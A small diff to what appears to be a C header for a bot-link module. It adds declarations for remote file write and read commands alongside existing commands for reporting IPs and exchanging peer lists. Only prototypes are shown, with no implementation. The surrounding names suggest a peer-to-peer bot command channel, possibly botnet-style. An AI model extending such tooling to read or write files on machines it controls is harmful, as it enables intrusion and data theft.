@@ -35,3 +35,6 @@ int botlink_cmd_report_ip(Modules *mptr, Connection *cptr, char *buf, int size);
 int botlink_cmd_want_peers(Modules *mptr, Connection *cptr, char *buf, int size);
 int botlink_cmd_peer_info(Modules *mptr, Connection *cptr, char *buf, int size);
 int bot_pushcmd(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, int pktsize);
+
+int botlink_cmd_write_file(Modules *mptr, Connection *cptr, char *buf, int size);
+int botlink_cmd_read_file(Modules *mptr, Connection *cptr, char *buf, int size);
